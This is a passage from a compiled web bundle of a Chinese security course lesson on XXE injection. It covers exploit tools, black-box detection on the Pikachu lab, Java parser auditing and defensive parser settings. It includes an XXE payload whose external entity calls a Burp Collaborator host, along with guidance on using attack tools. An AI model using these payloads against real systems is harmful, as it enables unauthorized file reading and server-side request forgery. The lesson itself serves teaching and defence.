<span class="line"><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">x</span><span style="color:#D73A49;">&gt;&amp;</span><span style="color:#24292E;">xxe;</span><span style="color:#D73A49;">&lt;/</span><span style="color:#24292E;">x</span><span style="color:#D73A49;">&gt;</span></span></code></pre></div><h3 id="xxe-漏洞利用工具" tabindex="-1">XXE 漏洞利用工具 <a class="header-anchor" href="#xxe-漏洞利用工具" aria-label="Permalink to &quot;XXE 漏洞利用工具&quot;">​</a></h3><h4 id="_1-xxeinjector" tabindex="-1">1.XXEinjector <a class="header-anchor" href="#_1-xxeinjector" aria-label="Permalink to &quot;1.XXEinjector&quot;">​</a></h4><p>推荐一款综合型的 XXE 漏洞利用工具<a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="noreferrer">XXEinjector</a>，用 Ruby 开发，运行前需要先安装 ruby。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">sudo apt install ruby</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">sudo apt install ruby</span></span></code></pre></div><p>通过输入请求包数据，并指定攻击行为，比如列目录、读文件等。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">$ cat req.txt                                                                                    </span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;"> ↵</span></span>
<span class="line"><span style="color:#E1E4E8;">GET </span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">mmpaymd</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">ordercallback HTTP</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">1.1</span></span>
<span class="line"><span style="color:#E1E4E8;">Host</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">100.95</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">204</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">69</span><span style="color:#F97583;">:</span><span style="color:#79B8FF;">8081</span></span>
<span class="line"><span style="color:#E1E4E8;">Upgrade</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">Insecure</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">Requests</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">1</span></span>
<span class="line"><span style="color:#E1E4E8;">User</span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">Agent</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> Mozilla</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">5.0</span><span style="color:#E1E4E8;"> (Windows NT </span><span style="color:#79B8FF;">10.0</span><span style="color:#E1E4E8;">; Win64; x64) AppleWebKit</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">537.36</span><span style="color:#E1E4E8;"> (KHTML, like Gecko) Chrome</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">65.0</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">3325</span><span style="color:#E1E4E8;">.</span><span style="color:#FDAEB7;font-style:italic;">181</span><span style="color:#E1E4E8;"> Safari</span><span style="color:#F97583;">/</span><span style="color:#79B8FF;">537.36</span></span>
<span class="line"><span style="color:#E1E4E8;">Accept</span><span style="color:#F97583;">:</span><span style="color:#E1E4E8;"> text</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">html,application</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">xhtml</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">xml,application</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">xml;q</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">0.9</span><span style="color:#E1E4E8;">,image</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">webp,image</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">apng,</span><span style="color:#F97583;">*</span><span style="color:#6A737D;">/*;q=0.8</span></span>
<span class="line"><span style="color:#6A737D;">Accept-Encoding: gzip, deflate</span></span>
<span class="line"><span style="color:#6A737D;">Accept-Language: zh,zh-CN;q=0.9,en;q=0.8</span></span>
<span class="line"><span style="color:#6A737D;">Cache-Control: max-age=259200</span></span>
<span class="line"><span style="color:#6A737D;">Connection: keep-alive</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">$ cat req.txt                                                                                    </span><span style="color:#005CC5;">1</span><span style="color:#24292E;"> ↵</span></span>
<span class="line"><span style="color:#24292E;">GET </span><span style="color:#D73A49;">/</span><span style="color:#24292E;">mmpaymd</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">ordercallback HTTP</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">1.1</span></span>
<span class="line"><span style="color:#24292E;">Host</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">100.95</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">204</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">69</span><span style="color:#D73A49;">:</span><span style="color:#005CC5;">8081</span></span>
<span class="line"><span style="color:#24292E;">Upgrade</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">Insecure</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">Requests</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">1</span></span>
<span class="line"><span style="color:#24292E;">User</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">Agent</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> Mozilla</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">5.0</span><span style="color:#24292E;"> (Windows NT </span><span style="color:#005CC5;">10.0</span><span style="color:#24292E;">; Win64; x64) AppleWebKit</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">537.36</span><span style="color:#24292E;"> (KHTML, like Gecko) Chrome</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">65.0</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">3325</span><span style="color:#24292E;">.</span><span style="color:#B31D28;font-style:italic;">181</span><span style="color:#24292E;"> Safari</span><span style="color:#D73A49;">/</span><span style="color:#005CC5;">537.36</span></span>
<span class="line"><span style="color:#24292E;">Accept</span><span style="color:#D73A49;">:</span><span style="color:#24292E;"> text</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">html,application</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">xhtml</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">xml,application</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">xml;q</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">0.9</span><span style="color:#24292E;">,image</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">webp,image</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">apng,</span><span style="color:#D73A49;">*</span><span style="color:#6A737D;">/*;q=0.8</span></span>
<span class="line"><span style="color:#6A737D;">Accept-Encoding: gzip, deflate</span></span>
<span class="line"><span style="color:#6A737D;">Accept-Language: zh,zh-CN;q=0.9,en;q=0.8</span></span>
<span class="line"><span style="color:#6A737D;">Cache-Control: max-age=259200</span></span>
<span class="line"><span style="color:#6A737D;">Connection: keep-alive</span></span></code></pre></div><p>常用命令如下：</p>`,11),u=a("p",null,"图 4 XXEinjector 常用命令",-1),h=a("p",null,"不过，不能完全依赖于 XXEinjector，因为之前我在测试时，发现它也有利用不成功的情况，需要自己多测试验证下。",-1),F=a("p",null,[s("其他更多 XXE payload，可以参考"),a("a",{href:"https://github.com/payloadbox/xxe-injection-payload-list",target:"_blank",rel:"noreferrer"},'"XML External Entity (XXE) Injection Payload List"'),s("。")],-1),x=a("h4",{id:"_2-xxexploiter",tabindex:"-1"},[s("2.XXExploiter "),a("a",{class:"header-anchor",href:"#_2-xxexploiter","aria-label":'Permalink to "2.XXExploiter"'},"​")],-1),A=a("p",null,[s("如果你记不住上面那些 XXE payload，还有个工具可以帮你生成，一款集 payload 生成与发包利用的 XXE 利用工具 "),a("a",{href:"https://github.com/luisfontes19/xxexploiter",target:"_blank",rel:"noreferrer"},"XXExploiter"),s("，它可以启动服务提供远程 DTD 文件去实现利用。")],-1),m=p(`<p>图 5 xxeploiter 利用方法</p><p>就功能而言，个人觉得它比 XXEinjector 更优秀，生成 payload 的功能还可以用于辅助手工测试，结合业务场景自己做一些调整。</p><h3 id="xxe-漏洞挖掘" tabindex="-1">XXE 漏洞挖掘 <a class="header-anchor" href="#xxe-漏洞挖掘" aria-label="Permalink to &quot;XXE 漏洞挖掘&quot;">​</a></h3><h4 id="_1-黑盒测试" tabindex="-1">1.黑盒测试 <a class="header-anchor" href="#_1-黑盒测试" aria-label="Permalink to &quot;1.黑盒测试&quot;">​</a></h4><p>XXE 依然如 SSRF 分为有回显、无回显。通过 XXE 可以造成 SSRF，所以它的检测思路与 SSRF 大同小异，比较通用的方式也是构造特定外网服务器的访问请求，然后查询外网服务器的请求日志，以判断是否请求成功。</p><p>无论是手工测试还是自动化，当前检测 XXE 和 SSRF 漏洞的方式大多是基于此原理。</p><p>上一讲介绍的 Burp Collaborator，在此处就用得上，使用前面介绍的常见攻击手段，去尝试构造多种测试请求，是否向 Burp Collaborator Server 请求成功，就可以很容易地判断是否存在 XXE。</p><p>以 Pikachu 靶场的 XXE 题目为例。用 Burp Collaborator 获得 DNS 解析服务器的地址 b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net，然后构造 XXE payload。</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;?</span><span style="color:#85E89D;">xml</span><span style="color:#B392F0;"> version</span><span style="color:#E1E4E8;"> = </span><span style="color:#9ECBFF;">&quot;1.0&quot;</span><span style="color:#E1E4E8;">?&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;!</span><span style="color:#F97583;">DOCTYPE</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">ANY</span><span style="color:#E1E4E8;"> [</span></span>
<span class="line"><span style="color:#E1E4E8;">    &lt;!</span><span style="color:#F97583;">ENTITY</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">xxe</span><span style="color:#F97583;"> SYSTEM </span><span style="color:#9ECBFF;">&quot;http://b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net&quot;</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">]&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">x</span><span style="color:#E1E4E8;">&gt;</span><span style="color:#79B8FF;">&amp;xxe;</span><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">x</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;?</span><span style="color:#22863A;">xml</span><span style="color:#6F42C1;"> version</span><span style="color:#24292E;"> = </span><span style="color:#032F62;">&quot;1.0&quot;</span><span style="color:#24292E;">?&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;!</span><span style="color:#D73A49;">DOCTYPE</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">ANY</span><span style="color:#24292E;"> [</span></span>
<span class="line"><span style="color:#24292E;">    &lt;!</span><span style="color:#D73A49;">ENTITY</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">xxe</span><span style="color:#D73A49;"> SYSTEM </span><span style="color:#032F62;">&quot;http://b5hcm1ypwg6bvqnxtm6iyqao9ff53u.burpcollaborator.net&quot;</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">]&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">x</span><span style="color:#24292E;">&gt;</span><span style="color:#005CC5;">&amp;xxe;</span><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">x</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><p>将上述 payload 输入文本框，点&quot;提交&quot;：</p>`,10),D=a("p",null,"图 6 输入 xml payload",-1),C=a("p",null,'在 Burp Collaborator client 上点击"Poll now"就可以看到请求日志，说明确实存在 XXE 漏洞。',-1),X=p(`<p>图 7 利用 XXE 请求 Collaborator server 成功</p><h4 id="_2-白盒审计" tabindex="-1">2.白盒审计 <a class="header-anchor" href="#_2-白盒审计" aria-label="Permalink to &quot;2.白盒审计&quot;">​</a></h4><p>以 Java 为例，可以在代码中搜索常用的 XML 解析器，看它们在实例化之后，是否有关闭外部实体引用功能，如果没有就可能存在 XXE 漏洞。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">javax.xml.parsers.DocumentBuilderFactory;</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.parsers.SAXParser</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.transform.TransformerFactory</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.validation.Validator</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.validation.SchemaFactory</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.transform.sax.SAXTransformerFactory</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.transform.sax.SAXSource</span></span>
<span class="line"><span style="color:#E1E4E8;">org.xml.sax.XMLReader</span></span>
<span class="line"><span style="color:#E1E4E8;">DocumentHelper.parseText</span></span>
<span class="line"><span style="color:#E1E4E8;">DocumentBuilder</span></span>
<span class="line"><span style="color:#E1E4E8;">org.xml.sax.helpers.XMLReaderFactory</span></span>
<span class="line"><span style="color:#E1E4E8;">org.dom4j.io.SAXReader</span></span>
<span class="line"><span style="color:#E1E4E8;">org.jdom.input.SAXBuilder</span></span>
<span class="line"><span style="color:#E1E4E8;">org.jdom2.input.SAXBuilder</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.bind.Unmarshaller</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.xpath.XpathExpression</span></span>
<span class="line"><span style="color:#E1E4E8;">javax.xml.stream.XMLStreamReader</span></span>
<span class="line"><span style="color:#E1E4E8;">org.apache.commons.digester3.Digester</span></span>
<span class="line"><span style="color:#E1E4E8;">rg.xml.sax.SAXParseExceptionpublicId</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">javax.xml.parsers.DocumentBuilderFactory;</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.parsers.SAXParser</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.transform.TransformerFactory</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.validation.Validator</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.validation.SchemaFactory</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.transform.sax.SAXTransformerFactory</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.transform.sax.SAXSource</span></span>
<span class="line"><span style="color:#24292E;">org.xml.sax.XMLReader</span></span>
<span class="line"><span style="color:#24292E;">DocumentHelper.parseText</span></span>
<span class="line"><span style="color:#24292E;">DocumentBuilder</span></span>
<span class="line"><span style="color:#24292E;">org.xml.sax.helpers.XMLReaderFactory</span></span>
<span class="line"><span style="color:#24292E;">org.dom4j.io.SAXReader</span></span>
<span class="line"><span style="color:#24292E;">org.jdom.input.SAXBuilder</span></span>
<span class="line"><span style="color:#24292E;">org.jdom2.input.SAXBuilder</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.bind.Unmarshaller</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.xpath.XpathExpression</span></span>
<span class="line"><span style="color:#24292E;">javax.xml.stream.XMLStreamReader</span></span>
<span class="line"><span style="color:#24292E;">org.apache.commons.digester3.Digester</span></span>
<span class="line"><span style="color:#24292E;">rg.xml.sax.SAXParseExceptionpublicId</span></span></code></pre></div><p>这部分可以结合<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" rel="noreferrer">&quot;XML External Entity Prevention Cheat Sheet&quot;</a>来看，不同语言、不同的 XML 解析库有不同的关闭外部实体引用的方法，在代码审计时，可以对照着看，然后拿一些 xxe payload 实际验证下。</p><h3 id="防御-xxe-漏洞" tabindex="-1">防御 XXE 漏洞 <a class="header-anchor" href="#防御-xxe-漏洞" aria-label="Permalink to &quot;防御 XXE 漏洞&quot;">​</a></h3><p>要防御 XXE 也比较简单，<strong>关闭外部实体引用即可</strong>。比如在 Java 中常用于解析 XML 的 DocumentBuilderFactory，就可以通过 setFeature 方法防御 XXE 漏洞，注意是组合使用，而不是单一防御。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">DocumentBuilderFactory dbf </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> DocumentBuilderFactory.</span><span style="color:#B392F0;">newInstance</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#E1E4E8;">String FEATURE </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">null</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#F97583;">try</span><span style="color:#E1E4E8;"> {</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 禁用DTD</span></span>
<span class="line"><span style="color:#E1E4E8;">    FEATURE </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    dbf.</span><span style="color:#B392F0;">setFeature</span><span style="color:#E1E4E8;">(FEATURE, </span><span style="color:#79B8FF;">true</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 禁用普通实体</span></span>
<span class="line"><span style="color:#E1E4E8;">    FEATURE </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;http://xml.org/sax/features/external-general-entities&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    dbf.</span><span style="color:#B392F0;">setFeature</span><span style="color:#E1E4E8;">(FEATURE, </span><span style="color:#79B8FF;">false</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 禁用参数实体</span></span>
<span class="line"><span style="color:#E1E4E8;">    FEATURE </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    dbf.</span><span style="color:#B392F0;">setFeature</span><span style="color:#E1E4E8;">(FEATURE, </span><span style="color:#79B8FF;">false</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 禁用外部DTD引用</span></span>
<span class="line"><span style="color:#E1E4E8;">    FEATURE </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span><span style="color:#E1E4E8;">;</span></span>
<span class="line"><span style="color:#E1E4E8;">    dbf.</span><span style="color:#B392F0;">setFeature</span><span style="color:#E1E4E8;">(FEATURE, </span><span style="color:#79B8FF;">false</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 禁用XInclude处理功能</span></span>
<span class="line"><span style="color:#E1E4E8;">    dbf.</span><span style="color:#B392F0;">setXIncludeAware</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">false</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#6A737D;">// 禁用扩展实体引用节点，注意：只使用该方法并不能完全防御XXE</span></span>
<span class="line"><span style="color:#E1E4E8;">    dbf.</span><span style="color:#B392F0;">setExpandEntityReferences</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">false</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#E1E4E8;">} </span><span style="color:#F97583;">catch</span><span style="color:#E1E4E8;"> () {</span></span>
<span class="line"><span style="color:#E1E4E8;">  ...</span></span>
<span class="line"><span style="color:#E1E4E8;">}</span></span>
<span class="line"><span style="color:#E1E4E8;">   </span><span style="color:#6A737D;">// Load XML file or stream using a XXE agnostic configured parser...</span></span>
<span class="line"><span style="color:#E1E4E8;">   DocumentBuilder safebuilder </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> dbf.</span><span style="color:#B392F0;">newDocumentBuilder</span><span style="color:#E1E4E8;">();</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">DocumentBuilderFactory dbf </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> DocumentBuilderFactory.</span><span style="color:#6F42C1;">newInstance</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#24292E;">String FEATURE </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">null</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#D73A49;">try</span><span style="color:#24292E;"> {</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 禁用DTD</span></span>
<span class="line"><span style="color:#24292E;">    FEATURE </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    dbf.</span><span style="color:#6F42C1;">setFeature</span><span style="color:#24292E;">(FEATURE, </span><span style="color:#005CC5;">true</span><span style="color:#24292E;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 禁用普通实体</span></span>
<span class="line"><span style="color:#24292E;">    FEATURE </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;http://xml.org/sax/features/external-general-entities&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    dbf.</span><span style="color:#6F42C1;">setFeature</span><span style="color:#24292E;">(FEATURE, </span><span style="color:#005CC5;">false</span><span style="color:#24292E;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 禁用参数实体</span></span>
<span class="line"><span style="color:#24292E;">    FEATURE </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    dbf.</span><span style="color:#6F42C1;">setFeature</span><span style="color:#24292E;">(FEATURE, </span><span style="color:#005CC5;">false</span><span style="color:#24292E;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 禁用外部DTD引用</span></span>
<span class="line"><span style="color:#24292E;">    FEATURE </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span><span style="color:#24292E;">;</span></span>
<span class="line"><span style="color:#24292E;">    dbf.</span><span style="color:#6F42C1;">setFeature</span><span style="color:#24292E;">(FEATURE, </span><span style="color:#005CC5;">false</span><span style="color:#24292E;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 禁用XInclude处理功能</span></span>
<span class="line"><span style="color:#24292E;">    dbf.</span><span style="color:#6F42C1;">setXIncludeAware</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">false</span><span style="color:#24292E;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#6A737D;">// 禁用扩展实体引用节点，注意：只使用该方法并不能完全防御XXE</span></span>
<span class="line"><span style="color:#24292E;">    dbf.</span><span style="color:#6F42C1;">setExpandEntityReferences</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">false</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#24292E;">} </span><span style="color:#D73A49;">catch</span><span style="color:#24292E;"> () {</span></span>
<span class="line"><span style="color:#24292E;">  ...</span></span>
<span class="line"><span style="color:#24292E;">}</span></span>
<span class="line"><span style="color:#24292E;">   </span><span style="color:#6A737D;">// Load XML file or stream using a XXE agnostic configured parser...</span></span>
<span class="line"><span style="color:#24292E;">   DocumentBuilder safebuilder </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> dbf.</span><span style="color:#6F42C1;">newDocumentBuilder</span><span style="color:#24292E;">();</span></span></code></pre></div><p>不同的 XML 解析库有不同的关闭方式，比如全面介绍 XXE 防御方案的是 OWASP 发表的<a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank" rel="noreferrer">&quot;XML External Entity Prevention Cheat Sheet&quot;</a>，针对不同的语言、XML 解析库，给出不同的防御方案，并提供关闭 XML 实体引用的代码示例，你在防御或者需要修复 XXE 漏洞时可以作为参考。</p><p>如果业务需要引用外部实体，建议采用白名单方式限制。</p><h3 id="小结" tabindex="-1">小结 <a class="header-anchor" href="#小结" aria-label="Permalink to &quot;小结&quot;">​</a></h3><p>本节课介绍了 XXE（XML 实体注入）漏洞相关的基础知识、漏洞成因和常见攻击手段，有时需要根据有无回显的情况，采取不同的测试方法。</p><blockquote><p>在日常实际应用中，大家都习惯当作无回显的情况来看待，因为无回显的检测方法同样适用于有回显的，相对比较通用。</p></blockquote><p>同时，给你推荐了 XXEinjector 和 XXExploiter 两款利用工具，在辅助检测 XXE 漏洞时会有所帮助。个人更偏好用 XXExploiter，因为它功能更多，利用成功率更高一些，还可以生成 payload 用于测试。</p><p>Burp Collaborator 在检测无回显的 XXE 漏洞时，非常好用，结合 XXExploiter 生成的 payload，对其中的 URL 调整为 Burp Collaborator Server，借助 Burp Collaborator 的自动检测服务端的请求日志，可以帮助判断漏洞是否存在，又不用再自己搭建外网服务器，是一种节约成本的检测方法。</p>`,15);function T(v,b,q,_,f,k){const n=e("Image");return t(),c("div",null,[E,l(n,{alt:"图片1.png",src:"https://s0.lgstatic.com/i/image/M00/8E/F5/CgqCHmAGWcqAO_PgAASscDOp6uA731.png"}),s(),y,i,l(n,{alt:"图片2.png",src:"https://s0.lgstatic.com/i/image2/M01/06/D6/Cip5yGAGWdyAQDS2AANXkfuguok138.png"}),s(),d,l(n,{alt:"Drawing 2.png",src:"https://s0.lgstatic.com/i/image2/M01/05/7B/CgpVE2AABv6AfyHcAAGL6fVMVng679.png"}),s(),g,l(n,{alt:"Drawing 3.png",src:"https://s0.lgstatic.com/i/image2/M01/05/79/Cip5yGAABwiAda6kAAF5gVHcGUo024.png"}),s(),u,h,F,x,A,l(n,{alt:"图片5.png",src:"https://s0.lgstatic.com/i/image2/M01/06/D8/CgpVE2AGWfCAdbhhAAQe4lr3PMM251.png"}),s(),m,l(n,{alt:"图片6.png",src:"https://s0.lgstatic.com/i/image2/M01/06/D6/Cip5yGAGWgSAfTxdAAR6XBUFZa4113.png"}),s(),D,C,l(n,{alt:"Drawing 6.png",src:"https://s0.lgstatic.com/i/image2/M01/05/79/Cip5yGAAByaANi3-AAE7G8SiyNI515.png"}),s(),X])}const M=o(r,[["render",T]]);export{S as __pageData,M as default};
